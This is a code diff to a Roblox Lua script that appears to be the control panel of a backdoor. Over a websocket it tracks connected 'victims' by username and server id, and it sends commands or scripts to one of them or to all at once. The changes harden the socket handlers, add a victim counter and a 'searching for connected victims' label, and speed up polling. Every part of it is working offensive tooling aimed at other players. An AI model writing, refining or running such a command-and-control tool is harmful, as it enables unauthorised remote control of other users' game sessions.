@@ -252,10 +252,10 @@ Frame_4248.Visible = true
 local TextLabel_3205 = Instance.new("TextLabel")
 TextLabel_3205.Parent = Frame_4248
 TextLabel_3205.Name = "player list tittle"
-TextLabel_3205.Size = UDim2.new(0, 320, 0, 45)
-TextLabel_3205.Position = UDim2.new(0.2, 0, 0, 0)
-TextLabel_3205.Text = "Player List (Target: TODOS)"
-TextLabel_3205.TextSize = 26
+TextLabel_3205.Size = UDim2.new(0, 360, 0, 45)
+TextLabel_3205.Position = UDim2.new(0.08, 0, 0, 0)
+TextLabel_3205.Text = "Player List (Target: TODOS | 0 Online)"
+TextLabel_3205.TextSize = 24
 TextLabel_3205.TextColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel_3205.Font = Enum.Font.Kalam
 pcall(function() TextLabel_3205.FontFace = Font.new("rbxasset://fonts/families/Kalam.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal) end)
@@ -294,6 +294,7 @@ ScrollingFrame_2194.AutomaticCanvasSize = Enum.AutomaticSize.None
 
 local VictimsLayout = Instance.new("UIListLayout")
 VictimsLayout.Padding = UDim.new(0, 4)
+VictimsLayout.SortOrder = Enum.SortOrder.LayoutOrder
 VictimsLayout.Parent = ScrollingFrame_2194
 
 ----------------------------------------------------
@@ -609,33 +610,39 @@ local function connectWS()
         wsConnected = true
         setStatus("Online", Color3.fromRGB(80, 255, 120))
 
-        pcall(function()
-            s.OnMessage:Connect(function(msg)
-                local success, data = pcall(function() return HttpService:JSONDecode(msg) end)
-                if success and data then
-                    if (data.type == "victim_joined" or data.type == "victim_ping") and data.username then
-                        connectedVictims[data.username] = {
-                            username = data.username,
-                            placeId = data.placeId,
-                            gameId = data.gameId,
-                            jobId = data.jobId,
-                            lastSeen = tick()
-                        }
-                        if rebuildVictimsUI then rebuildVictimsUI() end
-                    elseif data.type == "cmd_ack" then
-                        setStatus("Ack: " .. tostring(data.username), Color3.fromRGB(80, 255, 120))
-                    end
+        local function onMsg(msg)
+            local success, data = pcall(function() return HttpService:JSONDecode(msg) end)
+            if success and data then
+                if (data.type == "victim_joined" or data.type == "victim_ping") and data.username then
+                    connectedVictims[data.username] = {
+                        username = data.username,
+                        placeId = data.placeId,
+                        gameId = data.gameId,
+                        jobId = data.jobId,
+                        lastSeen = tick()
+                    }
+                    if rebuildVictimsUI then rebuildVictimsUI() end
+                elseif data.type == "cmd_ack" then
+                    setStatus("Ack: " .. tostring(data.username), Color3.fromRGB(80, 255, 120))
                 end
-            end)
-        end)
+            end
+        end
 
-        pcall(function()
-            s.OnClose:Connect(function()
-                wsConnected = false
-                currentSocket = nil
-                setStatus("Offline", Color3.fromRGB(255, 100, 100))
-            end)
-        end)
+        pcall(function() s.OnMessage:Connect(onMsg) end)
+        pcall(function() s.OnMessage:connect(onMsg) end)
+        pcall(function() s.onmessage = onMsg end)
+        pcall(function() s.OnMessage = onMsg end)
+
+        local function onClose()
+            wsConnected = false
+            currentSocket = nil
+            setStatus("Offline", Color3.fromRGB(255, 100, 100))
+        end
+
+        pcall(function() s.OnClose:Connect(onClose) end)
+        pcall(function() s.OnClose:connect(onClose) end)
+        pcall(function() s.onclose = onClose end)
+        pcall(function() s.OnClose = onClose end)
 
         pcall(function()
             s:Send(HttpService:JSONEncode({type = "ping_victims"}))
@@ -710,7 +717,7 @@ local function sendCmd(action, extra)
         wsConnected = false
         currentSocket = nil
         connectWS()
-        task.wait(0.4)
+        task.wait(0.3)
         if currentSocket and wsConnected then
             pcall(function() currentSocket:Send(raw) end)
         end
@@ -728,12 +735,18 @@ rebuildVictimsUI = function()
         end
     end
 
-    TextLabel_3205.Text = "Player List (Target: " .. tostring(selectedVictim) .. ")"
+    local victimCount = 0
+    for _ in pairs(connectedVictims) do
+        victimCount = victimCount + 1
+    end
+
+    TextLabel_3205.Text = string.format("Player List (Target: %s | %d Online)", tostring(selectedVictim), victimCount)
 
     -- Card 0: TODOS
     local isTodosSelected = (selectedVictim == "TODOS")
     local allCard = Instance.new("Frame")
-    allCard.Name = "VictimCard_TODOS"
+    allCard.Name = "VictimCard_00_TODOS"
+    allCard.LayoutOrder = 1
     allCard.Size = UDim2.new(1, -6, 0, 32)
     allCard.BackgroundColor3 = isTodosSelected and Color3.fromRGB(50, 40, 70) or Color3.fromRGB(20, 20, 25)
     allCard.BackgroundTransparency = 0.2
@@ -782,6 +795,7 @@ rebuildVictimsUI = function()
         local isSelected = (selectedVictim == name)
         local card = Instance.new("Frame")
         card.Name = "VictimCard_" .. name
+        card.LayoutOrder = count
         card.Size = UDim2.new(1, -6, 0, 32)
         card.BackgroundColor3 = isSelected and Color3.fromRGB(50, 40, 70) or Color3.fromRGB(20, 20, 25)
         card.BackgroundTransparency = 0.2
@@ -847,7 +861,20 @@ rebuildVictimsUI = function()
         end)
     end
 
-    ScrollingFrame_2194.CanvasSize = UDim2.new(0, 0, 0, count * 36 + 10)
+    if victimCount == 0 then
+        local emptyLbl = Instance.new("TextLabel")
+        emptyLbl.Name = "EmptyLabel"
+        emptyLbl.LayoutOrder = 99
+        emptyLbl.Size = UDim2.new(1, -6, 0, 28)
+        emptyLbl.BackgroundTransparency = 1
+        emptyLbl.Text = "Buscando victimas conectadas..."
+        emptyLbl.TextColor3 = Color3.fromRGB(160, 150, 180)
+        emptyLbl.Font = Enum.Font.Kalam
+        emptyLbl.TextSize = 16
+        emptyLbl.Parent = ScrollingFrame_2194
+    end
+
+    ScrollingFrame_2194.CanvasSize = UDim2.new(0, 0, 0, (count + 1) * 36 + 10)
 end
 
 local function refreshList()
@@ -858,11 +885,13 @@ local function refreshList()
             currentSocket:Send(HttpService:JSONEncode({type = "ping_victims"}))
         end)
     end
-    task.wait(0.8)
+    task.wait(0.3)
     local now = tick()
+    local changed = false
     for name, info in pairs(connectedVictims) do
-        if now - (info.lastSeen or now) > 90 then
+        if now - (info.lastSeen or now) > 60 then
             connectedVictims[name] = nil
+            changed = true
         end
     end
     rebuildVictimsUI()
@@ -933,21 +962,21 @@ hookBtn(scriptSendBtn, function()
 end)
 
 ----------------------------------------------------
--- BACKGROUND CONNECTION LOOP
+-- BACKGROUND CONNECTION & CONTINUOUS SYNC LOOP
 ----------------------------------------------------
 rebuildVictimsUI()
 
 task.spawn(function()
     connectWS()
-    task.wait(1)
+    task.wait(0.5)
     refreshList()
     while true do
-        task.wait(15)
+        task.wait(3)
         if not wsConnected or not currentSocket then
             connectWS()
         else
             local pingOk = pcall(function()
-                currentSocket:Send(HttpService:JSONEncode({type = "ping"}))
+                currentSocket:Send(HttpService:JSONEncode({type = "ping_victims"}))
             end)
             if not pingOk then
                 wsConnected = false
@@ -957,7 +986,7 @@ task.spawn(function()
             local now = tick()
             local changed = false
             for name, info in pairs(connectedVictims) do
-                if now - (info.lastSeen or now) > 35 then
+                if now - (info.lastSeen or now) > 60 then
                     connectedVictims[name] = nil
                     changed = true
                 end
